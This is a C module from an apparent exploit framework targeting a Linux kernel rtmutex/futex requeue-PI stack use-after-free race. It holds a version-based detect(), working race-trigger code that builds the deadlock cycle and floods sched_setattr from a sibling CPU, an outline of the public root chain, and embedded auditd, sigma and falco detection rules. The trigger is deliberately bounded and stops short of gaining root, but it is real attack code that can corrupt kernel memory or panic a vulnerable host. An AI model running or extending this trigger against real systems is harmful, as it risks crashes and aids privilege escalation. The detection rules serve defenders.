/*
 * ghostlock_cve_2026_43499 — SKELETONKEY module
 *
 * CVE-2026-43499 — "GhostLock", a race-condition use-after-free on kernel
 * STACK memory in the Linux rtmutex / futex requeue-PI code path
 * (kernel/locking/rtmutex.c). On the deadlock-rollback path,
 * remove_waiter() operates on `current` instead of the actual waiter task
 * while unwinding a proxy lock in rt_mutex_start_proxy_lock() — reached
 * from futex_requeue(). If a concurrent PI-chain priority walk (driven
 * from another CPU via sched_setattr()) runs at that instant,
 * `pi_blocked_on` is cleared on the WRONG task and an on-stack
 * `struct rt_mutex_waiter` is left dangling in a task's waiter / pi tree.
 * When the kernel later rotates that rbtree over the (now-reused) stack
 * frame, the forged node fields become a controlled kernel write → UAF.
 * Reachable by ANY unprivileged local user (CVSS PR:L): plain futex(2) +
 * sched_setattr(2), no user namespace, no capability, no special CONFIG
 * beyond CONFIG_FUTEX_PI (universally enabled). The bug has existed since
 * PI-futex requeue landed — ~15 years, across every distribution.
 *
 * Public research + PoC — "IonStack part II: GhostLock" by VEGA / Nebula
 * Security (https://nebusec.ai/research/ionstack-part-2/; code at
 * https://github.com/NebuSec/CyberMeowfia, Apache-2.0). A portable crash
 * PoC drives the -EDEADLK rollback while a sibling-core consumer thread
 * fires sched_setattr(SCHED_BATCH) to win the race; a separate full
 * Android/Pixel LPE then forges the on-stack rt_mutex_waiter on a leaked
 * kernel page (the "KernelSnitch" futex-bucket timing side channel),
 * overwrites a struct file f_op → configfs/ashmem arbitrary R/W → pipe
 * physical R/W → cred patch → root. ~97% stable on kernelCTF; Google
 * awarded $92,337.
 *
 * CWE-416 (Use After Free) via CWE-362 (race). CVSS 7.8 (PR:L). Introduced
 * ~2.6.39 (PI-futex requeue); fixed by commit 3bfdc63936dd ("rtmutex: Use
 * waiter::task instead of current in remove_waiter()") merged for 7.1-rc1;
 * stable backports 7.0.4 / 6.18.27 / 6.12.86 / 6.6.140 / 6.1.175. The
 * 5.15 / 5.10 / 5.4 / 4.19 LTS branches are AFFECTED with no upstream
 * stable fix published at time of writing. NOT in CISA KEV (brand new).
 *
 * STATUS: 🟡 TRIGGER (reconstructed) — reachability-only, NOT VM-verified.
 *   exploit() forks an isolated child that, in two phases:
 *     (A) DETERMINISTIC + SAFE — builds the requeue-PI cycle (a waiter
 *         holding a "chain" PI-futex and parked in FUTEX_WAIT_REQUEUE_PI;
 *         an owner holding the "target" PI-futex and blocked on the chain)
 *         and fires FUTEX_CMP_REQUEUE_PI, confirming the kernel returns
 *         -EDEADLK. That -EDEADLK proves the remove_waiter() deadlock-
 *         rollback path (where the bug lives) is REACHABLE on this host.
 *         With no concurrent priority walk, the rollback is the kernel's
 *         normal, correct deadlock rejection — it creates no dangling
 *         pointer, so this phase is safe on any kernel.
 *     (B) HARD-BOUNDED window exercise — repeats (A) a small, wall-clock-
 *         capped number of times with a sibling-core consumer thread
 *         hammering sched_setattr(SCHED_BATCH) on the waiter's tid, so the
 *         PI-chain priority walk overlaps the rollback (the actual race).
 *         Then it STOPS. It deliberately OMITS the memfd/PUNCH_HOLE
 *         copy_from_user widening and the kernel-stack spray that make a
 *         win likely, does NOT reoccupy the freed frame, and does NOT
 *         bundle the KernelSnitch leak → forged-waiter → fops/configfs/
 *         ashmem/pipe R/W → cred-patch chain (Android/Pixel-specific,
 *         per-build offsets). It returns EXPLOIT_FAIL and never claims
 *         root it did not get.
 *   A *won* race here corrupts the kernel STACK and drives a near-arbitrary
 *   pointer write — near-certain panic on a vulnerable host — which is why
 *   this carries the lowest --auto safety rank in the corpus (see
 *   module_safety_rank() in skeletonkey.c).
 *
 * detect() is a pure version gate: vulnerable iff the running kernel is
 *   >= 2.6.39 (when PI-futex requeue arrived) AND below the fix on its
 *   branch. CONFIG_FUTEX_PI is a (near-universal) precondition that
 *   detect() ASSUMES rather than probes — no distro tracker publishes a
 *   CONFIG gate and /proc/config.gz is often absent; there is likewise no
 *   userns / capability precondition (CVSS PR:L, any local user).
 *
 * arch_support: any — the bug and this reachability probe are arch-neutral
 *   (futex / sched_setattr / pthreads); only the public *weaponization* is
 *   arm64/Android-specific, and none of it is bundled here.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"

#include <stdint.h>
#include <stdatomic.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/syscall.h>

/* futex operation constants — define defensively; <linux/futex.h> is not
 * always present and can clash with libc headers. */
#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI            6
#endif
#ifndef FUTEX_UNLOCK_PI
#define FUTEX_UNLOCK_PI          7
#endif
#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI    11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI     12
#endif
#ifndef FUTEX_CLOCK_REALTIME
#define FUTEX_CLOCK_REALTIME     256
#endif
#ifndef SCHED_BATCH
#define SCHED_BATCH              3
#endif

/* ------------------------------------------------------------------
 * Kernel-range table. Mainline fix landed in 7.1-rc1 (3bfdc63936dd);
 * stable backports shipped per LTS branch below. A branch with an exact
 * entry is patched iff host.patch >= entry.patch; any branch strictly
 * newer than EVERY entry (i.e. 7.1+) is patched-via-mainline; every other
 * branch (5.4/5.10/5.15 — affected, no upstream fix — and the EOL lines
 * 6.2..6.5 / 6.7..6.11 / 6.13..6.17 / 6.19 / 7.0.<4) is still vulnerable.
 * kernel_range_is_patched() implements exactly that. Extend the table as
 * more branches publish backports (the drift checker flags them).
 * Authoritative source: the Linux kernel CNA record (git.kernel.org
 * /stable/c/<hash>), corroborated by Debian/Ubuntu/SUSE trackers.
 * ------------------------------------------------------------------ */
static const struct kernel_patched_from ghostlock_patched_branches[] = {
    {6, 1,  175},   /* 6.1 LTS  — d8cce4773c2b */
    {6, 6,  140},   /* 6.6 LTS  — 8a1fc8d698ac */
    {6, 12, 86},    /* 6.12 LTS — 6d52dfcb2a5d */
    {6, 18, 27},    /* 6.18     — 3fb7394a8377 */
    {7, 0,  4},     /* 7.0      — 88614876370a; 7.1+ inherits the mainline fix */
};

static const struct kernel_range ghostlock_range = {
    .patched_from = ghostlock_patched_branches,
    .n_patched_from = sizeof(ghostlock_patched_branches) /
                      sizeof(ghostlock_patched_branches[0]),
};

static skeletonkey_result_t ghostlock_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] ghostlock: host fingerprint missing kernel "
                            "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* PI-futex requeue (and thus the vulnerable rt_mutex_start_proxy_lock
     * / remove_waiter rollback) arrived in 2.6.39; older kernels predate
     * the code entirely. (In practice nothing modern is below this, but
     * the gate is here for correctness.) */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 2, 6, 39)) {
        if (!ctx->json)
            fprintf(stderr, "[i] ghostlock: kernel %s predates PI-futex requeue "
                            "(introduced 2.6.39) — not affected\n", v->release);
        return SKELETONKEY_OK;
    }

    if (kernel_range_is_patched(&ghostlock_range, v)) {
        if (!ctx->json)
            fprintf(stderr, "[+] ghostlock: kernel %s is patched (>= 7.0.4 / "
                            "6.12.86 / 6.6.140 / 6.1.175 on-branch, or 7.1+ "
                            "mainline)\n", v->release);
        return SKELETONKEY_OK;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] ghostlock: VULNERABLE — kernel %s below the fix on "
                        "its branch; rtmutex/futex requeue-PI remove_waiter() "
                        "stack UAF reachable by any unprivileged user (no userns "
                        "/ capability; assumes CONFIG_FUTEX_PI, near-universal)\n",
                v->release);
        fprintf(stderr, "[i] ghostlock: no unprivileged-userns or sysctl stopgap "
                        "applies (PI futexes cannot be disabled at runtime) — the "
                        "only fix is to patch the kernel\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ------------------------------------------------------------------
 * Reconstructed reachability trigger (deliberately under-driven).
 *
 * Faithful minimal shape of the public PoC's requeue-PI cycle:
 *   waiter : LOCK_PI(chain);  WAIT_REQUEUE_PI(wait -> target)   [parks]
 *   owner  : LOCK_PI(target); LOCK_PI(chain)                    [blocks]
 *   main   : CMP_REQUEUE_PI(wait -> target)  =>  -EDEADLK
 * The requeue would make the waiter block on `target` (held by owner),
 * owner is blocked on `chain` (held by waiter) → cycle → rt_mutex
 * deadlock detection returns -EDEADLK and runs remove_waiter() rollback.
 *
 * Phase A (no consumer) confirms that rollback path is REACHABLE — safe,
 * because without a concurrent PI priority walk the unwind is the normal
 * correct deadlock rejection and leaves nothing dangling. Phase B adds a
 * sibling-core sched_setattr(SCHED_BATCH) storm on the waiter's tid to
 * overlap the walk with the rollback (the actual race), hard-bounded,
 * then stops. We do NOT widen the copy_from_user window (no memfd /
 * PUNCH_HOLE), do NOT spray/reoccupy the freed stack frame, and do NOT
 * weaponise. The honest witness is coarse: the -EDEADLK reachability
 * proof, plus a fault signal in the isolated child if a Phase-B race
 * happened to fire. Absence of a fault does NOT prove the host is safe.
 * ------------------------------------------------------------------ */
#define GHL_PROBE_ROUNDS      8    /* deterministic -EDEADLK confirmations (early-exit on first) */
#define GHL_RACE_ITERS        24   /* hard-bounded race-window exercise (concurrent sched_setattr) */
#define GHL_RACE_BUDGET_SECS  2    /* honest short cap (public PoC grinds for minutes) */
#define GHL_PARK_TIMEOUT_MS   60   /* parked waiter/owner self-unblock so no attempt hangs */

struct ghl_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

struct ghl_attempt {
    volatile uint32_t chain;    /* PI futex the waiter holds */
    volatile uint32_t target;   /* PI futex the owner holds; requeue destination */
    volatile uint32_t wait;     /* plain futex the waiter parks on */
    atomic_int waiter_ready;    /* waiter holds chain + published tid */
    atomic_int owner_ready;     /* owner holds target + about to block on chain */
    atomic_int waiter_tid;      /* consumer targets this tid */
    atomic_int stop;            /* tear-down flag for the consumer */
};

static long ghl_futex(volatile uint32_t *uaddr, int op, uint32_t val,
                      void *timeout_or_val2, volatile uint32_t *uaddr2,
                      uint32_t val3)
{
    return syscall(SYS_futex, uaddr, op, val, timeout_or_val2, uaddr2, val3);
}

static int ghl_gettid(void)
{
    return (int)syscall(SYS_gettid);
}

static void ghl_pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    (void)sched_setaffinity(0, sizeof set, &set);   /* best-effort */
}

static void ghl_abs_realtime_ms(struct timespec *ts, long ms)
{
    clock_gettime(CLOCK_REALTIME, ts);
    ts->tv_sec  += ms / 1000;
    ts->tv_nsec += (ms % 1000) * 1000000L;
    if (ts->tv_nsec >= 1000000000L) { ts->tv_sec++; ts->tv_nsec -= 1000000000L; }
}

static void *ghl_waiter_fn(void *arg)
{
    struct ghl_attempt *a = (struct ghl_attempt *)arg;
    ghl_pin_cpu(0);
    /* Acquire the chain PI-futex (uncontended → success, sets it to our tid). */
    (void)ghl_futex(&a->chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store_explicit(&a->waiter_tid, ghl_gettid(), memory_order_release);
    atomic_store_explicit(&a->waiter_ready, 1, memory_order_release);
    /* Park, pre-queued to be requeued onto `target`. Short absolute timeout
     * so we self-unblock even if the requeue is refused (-EDEADLK). */
    struct timespec ts;
    ghl_abs_realtime_ms(&ts, GHL_PARK_TIMEOUT_MS);
    (void)ghl_futex(&a->wait, FUTEX_WAIT_REQUEUE_PI | FUTEX_CLOCK_REALTIME, 0,
                    &ts, &a->target, 0);
    (void)ghl_futex(&a->chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static void *ghl_owner_fn(void *arg)
{
    struct ghl_attempt *a = (struct ghl_attempt *)arg;
    ghl_pin_cpu(0);
    while (!atomic_load_explicit(&a->waiter_ready, memory_order_acquire))
        sched_yield();
    (void)ghl_futex(&a->target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);  /* hold target */
    atomic_store_explicit(&a->owner_ready, 1, memory_order_release);
    struct timespec ts;
    ghl_abs_realtime_ms(&ts, GHL_PARK_TIMEOUT_MS);
    (void)ghl_futex(&a->chain, FUTEX_LOCK_PI, 0, &ts, NULL, 0);    /* block on chain */
    (void)ghl_futex(&a->target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static void *ghl_consumer_fn(void *arg)
{
    struct ghl_attempt *a = (struct ghl_attempt *)arg;
    ghl_pin_cpu(1);   /* sibling CPU */
    while (!atomic_load_explicit(&a->waiter_tid, memory_order_acquire))
        sched_yield();
    int tid = atomic_load_explicit(&a->waiter_tid, memory_order_acquire);
    struct ghl_sched_attr sa;
    memset(&sa, 0, sizeof sa);
    sa.size = sizeof sa;
    sa.sched_policy = SCHED_BATCH;
    sa.sched_nice   = 19;
    /* Hammer a PI-chain priority walk on the waiter concurrently with the
     * rollback. SYS_sched_setattr may be absent on ancient toolchains. */
    while (!atomic_load_explicit(&a->stop, memory_order_acquire)) {
#ifdef SYS_sched_setattr
        (void)syscall(SYS_sched_setattr, tid, &sa, 0u);
#else
        sched_yield();
#endif
    }
    return NULL;
}

/* One attempt: build the requeue-PI cycle and fire CMP_REQUEUE_PI. With
 * with_race, run the concurrent sched_setattr storm. Returns 1 iff the
 * kernel returned -EDEADLK (the rollback path was reached). */
static int ghl_one_attempt(int with_race)
{
    struct ghl_attempt a;
    memset(&a, 0, sizeof a);

    pthread_t tw, to, tc;
    int have_tc = 0;

    if (pthread_create(&tw, NULL, ghl_waiter_fn, &a) != 0)
        return 0;
    while (!atomic_load_explicit(&a.waiter_ready, memory_order_acquire))
        sched_yield();

    if (pthread_create(&to, NULL, ghl_owner_fn, &a) != 0) {
        atomic_store_explicit(&a.stop, 1, memory_order_release);
        pthread_join(tw, NULL);
        return 0;
    }
    while (!atomic_load_explicit(&a.owner_ready, memory_order_acquire))
        sched_yield();

    if (with_race && pthread_create(&tc, NULL, ghl_consumer_fn, &a) == 0)
        have_tc = 1;

    /* Settle: let the waiter park in WAIT_REQUEUE_PI and the owner in
     * LOCK_PI(chain) before we close the cycle. */
    usleep(3000);

    errno = 0;
    long r = ghl_futex(&a.wait, FUTEX_CMP_REQUEUE_PI, 1,
                       (void *)(uintptr_t)1, &a.target, 0);
    int got_edeadlk = (r == -1 && errno == EDEADLK);

    atomic_store_explicit(&a.stop, 1, memory_order_release);
    if (have_tc) pthread_join(tc, NULL);
    pthread_join(to, NULL);   /* parked threads self-unblock via their timeouts */
    pthread_join(tw, NULL);
    return got_edeadlk;
}

static skeletonkey_result_t ghostlock_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = ghostlock_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] ghostlock: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] ghostlock: already running as root\n");
        return SKELETONKEY_OK;
    }

    if (!ctx->json)
        fprintf(stderr, "[*] ghostlock: reconstructed reachability probe — builds "
                        "the requeue-PI cycle and confirms the -EDEADLK "
                        "remove_waiter() rollback path is reachable, then exercises "
                        "the race window %d bounded times (%ds cap) with a "
                        "sibling-CPU sched_setattr storm, and stops. The "
                        "KernelSnitch leak → forged-waiter → fops/ashmem/pipe R/W "
                        "→ cred-patch root-pop is NOT bundled.\n",
                GHL_RACE_ITERS, GHL_RACE_BUDGET_SECS);

    /* Fork-isolated: a *won* Phase-B race corrupts the kernel stack. On a
     * KASAN kernel that oopses (contained to the child); on a plain
     * vulnerable kernel it may panic — which is exactly why the attempt
     * count is hard-bounded and the window is never widened. */
    pid_t child = fork();
    if (child < 0) { perror("[-] fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        /* Phase A — deterministic, safe reachability confirmation. */
        int edeadlk = 0;
        for (int i = 0; i < GHL_PROBE_ROUNDS && !edeadlk; i++)
            edeadlk = ghl_one_attempt(0 /* no race */);

        /* Phase B — hard-bounded window exercise (concurrent priority walk). */
        int fired = 0;
        time_t deadline = time(NULL) + GHL_RACE_BUDGET_SECS;
        for (int i = 0; i < GHL_RACE_ITERS && time(NULL) < deadline; i++) {
            (void)ghl_one_attempt(1 /* with race */);
            fired = i + 1;
        }

        if (!ctx->json)
            fprintf(stderr, "[i] ghostlock: requeue-PI rollback reachable: %s; "
                            "%d bounded race-window iterations fired\n",
                    edeadlk ? "YES (-EDEADLK observed)" : "not observed", fired);
        _exit(edeadlk ? 100 : 101);
    }

    int status;
    waitpid(child, &status, 0);
    if (WIFSIGNALED(status)) {
        if (!ctx->json)
            fprintf(stderr, "[!] ghostlock: child died by signal %d — the "
                            "requeue-PI stack UAF may have fired (KASAN oops / "
                            "corruption fault). This is the bug, but no root was "
                            "obtained.\n",
                    WTERMSIG(status));
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (WIFEXITED(status) &&
        (WEXITSTATUS(status) == 100 || WEXITSTATUS(status) == 101)) {
        if (!ctx->json) {
            if (WEXITSTATUS(status) == 100)
                fprintf(stderr, "[!] ghostlock: the vulnerable requeue-PI "
                                "deadlock-rollback path IS reachable here "
                                "(-EDEADLK) and the race window was exercised — "
                                "reconstructed primitive, honest EXPLOIT_FAIL.\n");
            else
                fprintf(stderr, "[!] ghostlock: race window exercised but the "
                                "-EDEADLK rollback path was not observed (timing, "
                                "or a hardened/patched-at-runtime kernel) — honest "
                                "EXPLOIT_FAIL.\n");
            fprintf(stderr, "[i] ghostlock: to complete: port the public "
                            "KernelSnitch page leak + forged on-stack "
                            "rt_mutex_waiter + fops/configfs/ashmem/pipe R/W + "
                            "cred patch for CVE-2026-43499 (Android/Pixel-specific, "
                            "per-build offsets — not bundled).\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (!ctx->json)
        fprintf(stderr, "[-] ghostlock: probe setup failed (child rc=%d)\n",
                WIFEXITED(status) ? WEXITSTATUS(status) : -1);
    return SKELETONKEY_EXPLOIT_FAIL;
}

#else  /* !__linux__ */

static skeletonkey_result_t ghostlock_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] ghostlock: Linux-only module (rtmutex/futex "
                        "requeue-PI stack UAF) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t ghostlock_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] ghostlock: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}

#endif /* __linux__ */

/* ----- Embedded detection rules -----
 *
 * Honesty note (see MODULE.md): unlike most kernel races, GhostLock has a
 * genuinely distinctive behavioural tell — a futex requeue-PI operation
 * (FUTEX_WAIT_REQUEUE_PI / FUTEX_CMP_REQUEUE_PI) returning -EDEADLK, which
 * glibc's requeue-PI usage inside pthread_cond_wait never provokes. The
 * catch: auditd/sigma see the `futex` syscall but not its op-vs-return
 * cheaply, and a bare `-S futex` watch would flood any host (futex is one
 * of the busiest syscalls). So the deployable auditd/sigma rules anchor on
 * the far rarer sched_setattr (the sibling-thread priority-walk driver) and
 * the post-exploitation euid-0 transition; the high-fidelity
 * requeue-PI-returns-EDEADLK signal is expressed in the falco/eBPF rule,
 * which can see the op and the return value. Tune per environment.
 */
static const char ghostlock_auditd[] =
    "# GhostLock — rtmutex/futex requeue-PI remove_waiter() stack UAF (CVE-2026-43499) — auditd rules\n"
    "# NOTE: a bare `-S futex` watch would flood auditd (futex is ubiquitous) and\n"
    "# auditd cannot cheaply test a syscall's return against its op, so we anchor on\n"
    "# the far rarer sched_setattr — the GhostLock trigger fires it on a SIBLING\n"
    "# thread in a tight loop (policy SCHED_BATCH) to drive the PI-chain priority\n"
    "# walk that wins the race — plus sched_setaffinity CPU pinning of the racers.\n"
    "# The high-fidelity 'requeue-PI returns EDEADLK' tell needs an eBPF/falco layer\n"
    "# that can see the op+retval (see the shipped falco rule). Correlate these in\n"
    "# your SIEM per-pid within a short window; individually they are benign.\n"
    "-a always,exit -F arch=b64 -S sched_setattr -k skeletonkey-ghostlock-schedattr\n"
    "-a always,exit -F arch=b64 -S sched_setaffinity -k skeletonkey-ghostlock-affinity\n"
    "# Post-exploitation fallback: unprivileged process -> euid 0 with no setuid execve.\n"
    "-a always,exit -F arch=b64 -S setresuid -F a0=0 -F a1=0 -F a2=0 -F auid>=1000 -F auid!=4294967295 -k skeletonkey-ghostlock-priv\n"
    "-a always,exit -F arch=b64 -S setuid -F a0=0 -F auid>=1000 -F auid!=4294967295 -k skeletonkey-ghostlock-priv\n";

static const char ghostlock_sigma[] =
    "title: Possible CVE-2026-43499 GhostLock rtmutex/futex requeue-PI stack UAF\n"
    "id: 2f8a6b4c-skeletonkey-ghostlock\n"
    "status: experimental\n"
    "description: |\n"
    "  GhostLock (CVE-2026-43499) is a stack UAF in the rtmutex/futex requeue-PI\n"
    "  rollback path, reachable by any unprivileged user via futex(2) +\n"
    "  sched_setattr(2). The strongest behavioural tell is a futex requeue-PI op\n"
    "  (FUTEX_WAIT_REQUEUE_PI=11 / FUTEX_CMP_REQUEUE_PI=12) returning -EDEADLK\n"
    "  (glibc never provokes this) interleaved with sched_setattr(SCHED_BATCH)\n"
    "  targeting a SIBLING thread and sched_setaffinity CPU pinning — but auditd\n"
    "  cannot see the futex op/return cheaply, so this rule keys on the rarer\n"
    "  sched_setattr driver and the post-exploitation euid-0 transition. Use the\n"
    "  falco/eBPF rule for the high-fidelity requeue-PI-EDEADLK signal. Expect\n"
    "  false positives from legitimate real-time / scheduler-tuning daemons.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  schedattr: {type: 'SYSCALL', syscall: 'sched_setattr'}\n"
    "  uid0:      {type: 'SYSCALL', syscall: 'setresuid', a0: 0, a1: 0, a2: 0}\n"
    "  unpriv:    {auid|expression: '>= 1000'}\n"
    "  condition: schedattr or (uid0 and unpriv)\n"
    "level: medium\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2026.43499]\n";

static const char ghostlock_falco[] =
    "- rule: Futex requeue-PI EDEADLK with sibling sched_setattr (possible CVE-2026-43499)\n"
    "  desc: |\n"
    "    GhostLock (CVE-2026-43499) rtmutex/futex requeue-PI stack UAF. High-fidelity\n"
    "    tell (needs a futex-aware eBPF probe that exposes the op + return value): a\n"
    "    FUTEX_WAIT_REQUEUE_PI / FUTEX_CMP_REQUEUE_PI that returns EDEADLK — glibc's\n"
    "    requeue-PI usage inside pthread_cond_wait never provokes it — combined with\n"
    "    the same tgid calling sched_setattr(SCHED_BATCH) on a sibling thread. Where\n"
    "    the probe cannot decode the futex op, fall back to the post-exploitation\n"
    "    effect below: a non-root process becoming root outside a setuid binary.\n"
    "  condition: >\n"
    "    (evt.type = futex and evt.rawres = -35) or\n"
    "    (evt.type in (setuid, setresuid) and evt.arg.uid = 0 and\n"
    "     not proc.is_setuid = true and user.uid != 0)\n"
    "  output: >\n"
    "    Possible CVE-2026-43499 GhostLock requeue-PI stack UAF\n"
    "    (user=%user.name proc=%proc.name pid=%proc.pid ppid=%proc.ppid evt=%evt.type res=%evt.res)\n"
    "  priority: WARNING\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2026.43499]\n";

const struct skeletonkey_module ghostlock_module = {
    .name           = "ghostlock",
    .cve            = "CVE-2026-43499",
    .summary        = "rtmutex/futex requeue-PI remove_waiter() stack UAF (\"GhostLock\") — clears pi_blocked_on on the wrong task during -EDEADLK rollback; ~15-year range, unprivileged, no userns",
    .family         = "rtmutex",
    .kernel_range   = "2.6.39 <= K < fix (introduced with PI-futex requeue); fixed 3bfdc63936dd (7.1-rc1), stable backports 7.0.4 / 6.18.27 / 6.12.86 / 6.6.140 / 6.1.175; 5.15/5.10/5.4/4.19 affected with no upstream stable fix; < 2.6.39 not affected",
    .detect         = ghostlock_detect,
    .exploit        = ghostlock_exploit,
    .mitigate       = NULL,   /* mitigation: upgrade kernel — PI futexes cannot be disabled at runtime, no userns/sysctl stopgap */
    .cleanup        = NULL,   /* trigger creates only throwaway futex words + threads in a fork-isolated child; no host artifacts */
    .detect_auditd  = ghostlock_auditd,
    .detect_sigma   = ghostlock_sigma,
    .detect_yara    = NULL,   /* pure in-kernel race — no file artifact to match */
    .detect_falco   = ghostlock_falco,
    .opsec_notes    = "detect() is a pure kernel-version gate (vulnerable iff >= 2.6.39 AND below the on-branch fix: stable backports 7.0.4 / 6.18.27 / 6.12.86 / 6.6.140 / 6.1.175, 7.1+ inherits mainline; 5.15/5.10/5.4/4.19 affected with no upstream fix) — no userns/CONFIG probe (CVSS PR:L, any local user; CONFIG_FUTEX_PI assumed, near-universal). exploit() forks an isolated child that (A) builds the requeue-PI cycle and confirms the -EDEADLK remove_waiter() rollback path is reachable — deterministic and safe, since without a concurrent priority walk the unwind creates no dangling pointer — then (B) exercises the actual race a hard-bounded 24 iterations / 2s with a sibling-CPU sched_setattr(SCHED_BATCH) storm on the waiter's tid, and stops. It is deliberately UNDER-DRIVEN: it does not widen the copy_from_user window (no memfd/PUNCH_HOLE), does not spray/reoccupy the freed kernel-stack frame, and does not bundle the KernelSnitch leak → forged on-stack rt_mutex_waiter → fops/configfs/ashmem/pipe R/W → cred-patch root-pop (Android/Pixel-specific, per-build offsets); the trigger is reconstructed from the public VEGA/Nebula PoC, not VM-verified, and returns EXPLOIT_FAIL. Telemetry footprint — unlike most kernel races GhostLock has a real behavioural signature: a burst of futex requeue-PI ops returning EDEADLK (glibc never does this) plus tight-loop sched_setattr(SCHED_BATCH) on a sibling thread and sched_setaffinity CPU pinning; and, only if a Phase-B race fires on a vulnerable host, a possible KASAN oops or kernel-stack panic. No persistent files. Lowest --auto safety rank in the corpus: a won race corrupts the kernel stack and drives a near-arbitrary pointer write.",
    .arch_support   = "any",
};

void skeletonkey_register_ghostlock(void)
{
    skeletonkey_register(&ghostlock_module);
}
